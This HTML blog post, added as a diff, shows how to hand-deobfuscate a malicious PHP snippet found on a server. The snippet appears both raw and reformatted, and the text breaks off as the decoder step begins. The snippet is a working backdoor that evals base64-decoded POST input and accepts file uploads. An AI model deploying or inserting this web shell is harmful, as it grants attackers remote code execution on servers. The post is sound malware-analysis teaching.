@@ -1,0 +1,1369 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+
+  <title>
+    
+      Lunchtime PHP Deobfuscation &middot; Ryan Kozak
+    
+  </title>
+
+  
+
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Abril+Fatface" />
+
+  <!-- Icons -->
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/favicon.png" />
+<link rel="shortcut icon" href="/favicon.ico" />
+
+  <!-- RSS -->
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml" />
+
+  <!-- Additional head bits without overriding original head -->
+
+  <!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Lunchtime PHP Deobfuscation | Ryan Kozak</title>
+<meta name="generator" content="Jekyll v3.8.7" />
+<meta property="og:title" content="Lunchtime PHP Deobfuscation" />
+<meta name="author" content="Ryan Kozak" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Deobfuscating a php script by hand. Here is an easy example of how to determine what a script is doing. Noncompiled languages are hard to hide things in." />
+<meta property="og:description" content="Deobfuscating a php script by hand. Here is an easy example of how to determine what a script is doing. Noncompiled languages are hard to hide things in." />
+<link rel="canonical" href="http://0.0.0.0:4000/lunchtime-php-deobfuscation/" />
+<meta property="og:url" content="http://0.0.0.0:4000/lunchtime-php-deobfuscation/" />
+<meta property="og:site_name" content="Ryan Kozak" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2018-07-10T19:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Lunchtime PHP Deobfuscation" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"Lunchtime PHP Deobfuscation","dateModified":"2019-07-17T21:51:17+00:00","datePublished":"2018-07-10T19:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/lunchtime-php-deobfuscation/"},"url":"http://0.0.0.0:4000/lunchtime-php-deobfuscation/","author":{"@type":"Person","name":"Ryan Kozak"},"description":"Deobfuscating a php script by hand. Here is an easy example of how to determine what a script is doing. Noncompiled languages are hard to hide things in.","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+</head>
+
+
+  <body class="post">
+
+    <div id="sidebar">
+  <header>
+    <div class="site-title">
+      <a href="/">
+        
+          <span class="back-arrow icon"><svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+  <path d="M0 0h24v24H0z" fill="none"/>
+  <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
+</svg></span>
+        
+        Ryan Kozak
+      </a>
+    </div>
+    <p class="lead">hacking, web development, $other</p>
+  </header>
+  <nav id="sidebar-nav-links">
+
+  
+    <a class="home-link "
+        href="/">Home</a>
+  
+
+  
+
+  
+
+  
+
+
+  
+    
+  
+
+  
+    
+    	
+      		<a class="page-link " href="/about/">About</a>
+    	
+    
+  
+
+  
+    
+    	
+      		<a class="page-link " href="/contact/">Contact</a>
+    	
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+    	
+      		<a class="page-link " href="/books/index.html">Book List</a>
+    	
+    
+  
+
+  
+    
+    	
+    	<!-- TingTingPowPow -->
+    	
+    
+  
+
+  
+    
+    	
+    	<!-- TingTingPowPow -->
+    	
+    
+  
+
+  
+    
+    	
+    	<!-- TingTingPowPow -->
+    	
+    
+  
+
+  
+    
+    	
+    	<!-- TingTingPowPow -->
+    	
+    
+  
+
+  
+    
+    	
+    	<!-- TingTingPowPow -->
+    	
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+
+
+  
+
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+  <!-- Optional additional links to insert in sidebar nav -->
+
+
+</nav>
+
+
+  <nav id="sidebar-icon-links">
+  
+    <a id="github-link"
+       class="icon" title="Github Profile" aria-label="Github Profile"
+       href="https://github.com/d0n601">
+      <svg version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 28"><path d="M12 2c6.625 0 12 5.375 12 12 0 5.297-3.437 9.797-8.203 11.391-0.609 0.109-0.828-0.266-0.828-0.578 0-0.391 0.016-1.687 0.016-3.297 0-1.125-0.375-1.844-0.812-2.219 2.672-0.297 5.484-1.313 5.484-5.922 0-1.313-0.469-2.375-1.234-3.219 0.125-0.313 0.531-1.531-0.125-3.187-1-0.313-3.297 1.234-3.297 1.234-0.953-0.266-1.984-0.406-3-0.406s-2.047 0.141-3 0.406c0 0-2.297-1.547-3.297-1.234-0.656 1.656-0.25 2.875-0.125 3.187-0.766 0.844-1.234 1.906-1.234 3.219 0 4.594 2.797 5.625 5.469 5.922-0.344 0.313-0.656 0.844-0.766 1.609-0.688 0.313-2.438 0.844-3.484-1-0.656-1.141-1.844-1.234-1.844-1.234-1.172-0.016-0.078 0.734-0.078 0.734 0.781 0.359 1.328 1.75 1.328 1.75 0.703 2.141 4.047 1.422 4.047 1.422 0 1 0.016 1.937 0.016 2.234 0 0.313-0.219 0.688-0.828 0.578-4.766-1.594-8.203-6.094-8.203-11.391 0-6.625 5.375-12 12-12zM4.547 19.234c0.031-0.063-0.016-0.141-0.109-0.187-0.094-0.031-0.172-0.016-0.203 0.031-0.031 0.063 0.016 0.141 0.109 0.187 0.078 0.047 0.172 0.031 0.203-0.031zM5.031 19.766c0.063-0.047 0.047-0.156-0.031-0.25-0.078-0.078-0.187-0.109-0.25-0.047-0.063 0.047-0.047 0.156 0.031 0.25 0.078 0.078 0.187 0.109 0.25 0.047zM5.5 20.469c0.078-0.063 0.078-0.187 0-0.297-0.063-0.109-0.187-0.156-0.266-0.094-0.078 0.047-0.078 0.172 0 0.281s0.203 0.156 0.266 0.109zM6.156 21.125c0.063-0.063 0.031-0.203-0.063-0.297-0.109-0.109-0.25-0.125-0.313-0.047-0.078 0.063-0.047 0.203 0.063 0.297 0.109 0.109 0.25 0.125 0.313 0.047zM7.047 21.516c0.031-0.094-0.063-0.203-0.203-0.25-0.125-0.031-0.266 0.016-0.297 0.109s0.063 0.203 0.203 0.234c0.125 0.047 0.266 0 0.297-0.094zM8.031 21.594c0-0.109-0.125-0.187-0.266-0.172-0.141 0-0.25 0.078-0.25 0.172 0 0.109 0.109 0.187 0.266 0.172 0.141 0 0.25-0.078 0.25-0.172zM8.937 21.438c-0.016-0.094-0.141-0.156-0.281-0.141-0.141 0.031-0.234 0.125-0.219 0.234 0.016 0.094 0.141 0.156 0.281 0.125s0.234-0.125 0.219-0.219z"></path>
+</svg>
+
+    </a>
+  
+
+  
+  <a id="stackoverflow-link"
+     class="icon" title="Stack Overflow Profile" aria-label="Stack Overflow Profile"
+     href="https://stackoverflow.com/users/4681506/ryan-kozak">
+    <?xml version="1.0" encoding="utf-8"?>
+<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 viewBox="0 0 120 120" style="enable-background:new 0 0 120 120;" xml:space="preserve">
+<style type="text/css">
+	.st0{fill:#BCBBBB;}
+	.st1{fill:#F48023;}
+</style>
+<polygon class="st0" points="84.4,93.8 84.4,70.6 92.1,70.6 92.1,101.5 22.6,101.5 22.6,70.6 30.3,70.6 30.3,93.8 "/>
+<path class="st1" d="M38.8,68.4l37.8,7.9l1.6-7.6l-37.8-7.9L38.8,68.4z M43.8,50.4l35,16.3l3.2-7l-35-16.4L43.8,50.4z M53.5,33.2
+	l29.7,24.7l4.9-5.9L58.4,27.3L53.5,33.2z M72.7,14.9l-6.2,4.6l23,31l6.2-4.6L72.7,14.9z M38,86h38.6v-7.7H38V86z"/>
+</svg>
+
+  </a>
+  
+
+  
+  
+  
+  
+
+  
+    <a id="tags-link"
+       class="icon"
+       title="Tags" aria-label="Tags"
+       href="/tags/">
+      <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0 0h24v24H0z" fill="none"/>
+    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
+</svg>
+    </a>
+  
+
+  
+    <a id="search-link"
+       class="icon"
+       title="Search" aria-label="Search"
+       href="/search/">
+      <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
+    <path d="M0 0h24v24H0z" fill="none"/>
+</svg>
+    </a>
+  
+
+  <!-- Optional additional links to insert for icons links -->
+</nav>
+ 
+  <p class="copyright">
+  &copy; 2021 Ryan Kozak.
+</p>
+
+</div>
+
+    <main class="container">
+      <header>
+  <h1 class="post-title">Lunchtime PHP Deobfuscation</h1>
+</header>
+<div class="content">
+  <div class="post-meta">
+  <span class="post-date">10 Jul 2018</span>
+  <span class="post-categories">
+    
+      &bull;
+
+      
+      
+      
+
+      
+        Security
+      
+    
+  </span>
+</div>
+
+  <div class="post-body">
+    <p>I came across the bit of code posted below today while browsing <a href="https://stackoverflow.com">Stack Overflow</a>. The user who posted the question was asking what this bit of code actually did. He was aware that it was malicious due to the fact that it was on his server without his knowledge, and obfuscated. Unfortunately the question was marked as off topic, “Questions asking us to recommend or find a book, tool, software library, tutorial or other off-site resource are off-topic”.</p>
+
+<p>A few users commented stating that they wouldn’t take the time deobfuscate the code, to not bother and just remove it from the server, etc. I thought the question was closed rather prematurely, because it is indeed related to programming. It’s also no more time consuming to reverse engineer this than it is to answer most other questions on Stack Overflow. I don’t subscribe to the philosophy that if you find a short snippet of obfuscated code on your server, you remove it without even attempting to see what it’s doing.</p>
+
+<p>Since this snippet is very short, and easily deobfuscated, here’s how it’s done in a few steps.</p>
+
+<h4 id="step-0-original-obfuscated-code">Step 0: Original Obfuscated Code</h4>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="mi">7457737</span><span class="o">+</span><span class="mi">736723</span><span class="p">;</span><span class="nv">$raPo_rZluoE</span><span class="o">=</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s2">"Y"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">109</span><span class="p">)</span><span class="mf">.</span><span class="s2">"F"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">122</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">90</span><span class="p">)</span><span class="mf">.</span><span class="s2">"T"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">89</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">48</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">88</span><span class="p">)</span><span class="mf">.</span><span class="s2">"2"</span><span class="mf">.</span><span class="s2">"R"</span><span class="mf">.</span><span class="s2">"l"</span><span class="mf">.</span><span class="s2">"Y"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span><span class="mf">.</span><span class="s2">"9"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">107</span><span class="p">)</span><span class="mf">.</span><span class="s2">"Z"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">81</span><span class="p">)</span><span class="mf">.</span><span class="s2">"="</span><span class="mf">.</span><span class="s2">"="</span><span class="p">);</span><span class="nv">$ydSJPtnwrSv</span><span class="o">=</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">89</span><span class="p">)</span><span class="mf">.</span><span class="s2">"2"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">57</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">119</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">101</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">81</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">61</span><span class="p">)</span><span class="mf">.</span><span class="s2">"="</span><span class="p">);</span><span class="k">eval</span><span class="p">(</span><span class="nv">$raPo_rZluoE</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">87</span><span class="p">)</span><span class="mf">.</span><span class="s2">"Q"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">61</span><span class="p">))]));</span><span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s2">"d"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">88</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">65</span><span class="p">)</span><span class="mf">.</span><span class="s2">"="</span><span class="p">)]</span> <span class="o">==</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="s2">"d"</span><span class="mf">.</span><span class="s2">"X"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">65</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">61</span><span class="p">))){</span><span class="o">@</span><span class="nv">$ydSJPtnwrSv</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">90</span><span class="p">)</span><span class="mf">.</span><span class="s2">"m"</span><span class="mf">.</span><span class="s2">"l"</span><span class="mf">.</span><span class="s2">"s"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">90</span><span class="p">)</span><span class="mf">.</span><span class="s2">"Q"</span><span class="mf">.</span><span class="s2">"="</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">61</span><span class="p">))][</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">71</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">49</span><span class="p">)</span><span class="mf">.</span><span class="s2">"w"</span><span class="mf">.</span><span class="s2">"X"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span><span class="mf">.</span><span class="s2">"5"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">104</span><span class="p">)</span><span class="mf">.</span><span class="s2">"b"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">87</span><span class="p">)</span><span class="mf">.</span><span class="s2">"U"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">61</span><span class="p">))],</span><span class="nv">$_FILES</span><span class="p">[</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s2">"Z"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">109</span><span class="p">)</span><span class="mf">.</span><span class="s2">"l"</span><span class="mf">.</span><span class="s2">"s"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">90</span><span class="p">)</span><span class="mf">.</span><span class="s2">"Q"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">61</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">61</span><span class="p">))][</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">98</span><span class="p">)</span><span class="mf">.</span><span class="s2">"m"</span><span class="mf">.</span><span class="s2">"F"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">116</span><span class="p">)</span><span class="mf">.</span><span class="s2">"Z"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">81</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">61</span><span class="p">)</span><span class="mf">.</span><span class="s2">"="</span><span class="p">)]);};</span> <span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<h4 id="step-1-human-readable-obfuscated-code">Step 1: Human Readable Obfuscated Code</h4>
+<p>Things become significantly easier to read once we simply add some tabs and line breaks. Go through the code, and find semicolons in order to make things easier to read. After that, add some comments of your own to see what’s good so far.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+	<span class="k">echo</span> <span class="mi">7457737</span><span class="o">+</span><span class="mi">736723</span><span class="p">;</span> <span class="c1">// Some integer, maybe an id of some sort.</span>
+	<span class="nv">$raPo_rZluoE</span><span class="o">=</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s2">"Y"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">109</span><span class="p">)</span><span class="mf">.</span><span class="s2">"F"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">122</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">90</span><span class="p">)</span><span class="mf">.</span><span class="s2">"T"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">89</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">48</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">88</span><span class="p">)</span><span class="mf">.</span><span class="s2">"2"</span><span class="mf">.</span><span class="s2">"R"</span><span class="mf">.</span><span class="s2">"l"</span><span class="mf">.</span><span class="s2">"Y"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span><span class="mf">.</span><span class="s2">"9"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">107</span><span class="p">)</span><span class="mf">.</span><span class="s2">"Z"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">81</span><span class="p">)</span><span class="mf">.</span><span class="s2">"="</span><span class="mf">.</span><span class="s2">"="</span><span class="p">);</span>  <span class="c1">// Some string</span>
+	<span class="nv">$ydSJPtnwrSv</span><span class="o">=</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">89</span><span class="p">)</span><span class="mf">.</span><span class="s2">"2"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">57</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">119</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">101</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">81</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">61</span><span class="p">)</span><span class="mf">.</span><span class="s2">"="</span><span class="p">);</span> <span class="c1">// Another string</span>
+	<span class="k">eval</span><span class="p">(</span><span class="nv">$raPo_rZluoE</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">87</span><span class="p">)</span><span class="mf">.</span><span class="s2">"Q"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">61</span><span class="p">))]));</span>  <span class="c1">// This is dangerous looking, an eval() call based on a POST request.</span>
+  <span class="c1">// If the POST matches something, move some (likely malicious) files.</span>
+	<span class="k">if</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s2">"d"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">88</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">65</span><span class="p">)</span><span class="mf">.</span><span class="s2">"="</span><span class="p">)]</span> <span class="o">==</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="s2">"d"</span><span class="mf">.</span><span class="s2">"X"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">65</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">61</span><span class="p">)))</span> <span class="p">{</span>
+
+		<span class="o">@</span><span class="nv">$ydSJPtnwrSv</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">90</span><span class="p">)</span><span class="mf">.</span><span class="s2">"m"</span><span class="mf">.</span><span class="s2">"l"</span><span class="mf">.</span><span class="s2">"s"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">90</span><span class="p">)</span><span class="mf">.</span><span class="s2">"Q"</span><span class="mf">.</span><span class="s2">"="</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">61</span><span class="p">))][</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">71</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">49</span><span class="p">)</span><span class="mf">.</span><span class="s2">"w"</span><span class="mf">.</span><span class="s2">"X"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span><span class="mf">.</span><span class="s2">"5"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">104</span><span class="p">)</span><span class="mf">.</span><span class="s2">"b"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">87</span><span class="p">)</span><span class="mf">.</span><span class="s2">"U"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">61</span><span class="p">))],</span><span class="nv">$_FILES</span><span class="p">[</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s2">"Z"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">109</span><span class="p">)</span><span class="mf">.</span><span class="s2">"l"</span><span class="mf">.</span><span class="s2">"s"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">90</span><span class="p">)</span><span class="mf">.</span><span class="s2">"Q"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">61</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">61</span><span class="p">))][</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">98</span><span class="p">)</span><span class="mf">.</span><span class="s2">"m"</span><span class="mf">.</span><span class="s2">"F"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">116</span><span class="p">)</span><span class="mf">.</span><span class="s2">"Z"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">81</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">61</span><span class="p">)</span><span class="mf">.</span><span class="s2">"="</span><span class="p">)]);</span>
+	<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<h4 id="step-2-quick--dirty-decoder">Step 2: Quick &amp; Dirty Decoder</h4>
+<p>In order to decode this entirely, without pissing away too much time, just use common sense. We’ll decode the script with itself by adding some comments to remove the malicious code we don’t want to run, and echos to see what these <code class="highlighter-rouge">base64</code> string really are. Essentially we’re just creating a clean printout of all the <code class="highlighter-rouge">base64_decode</code> calls.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
